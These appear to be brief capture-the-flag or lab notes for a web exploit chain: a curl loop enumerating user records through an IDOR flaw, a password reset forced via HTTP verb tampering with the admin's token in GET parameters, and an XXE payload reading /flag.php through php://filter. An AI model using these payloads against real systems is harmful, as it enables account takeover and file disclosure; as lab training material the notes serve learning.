1. Enumerate users (IDOR)
```shell-session
for i in {1..100}; do curl -s "http://94.237.48.12:39808/api.php/user/$i" -H "Cookie: PHPSESSID=d8sskie22digjhc13fra80lh62; uid=$i"; echo; done >> wow.txt
```
- Admin is uid 52

2. HTTP Verb Tampering
- Get token in change password portal for admin
- Change POST to GET and put the data as parameters: reset.php?uid=52&token=3253&password=test123

3. XXE
<!DOCTYPE name [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>

<name>&company;<name/>

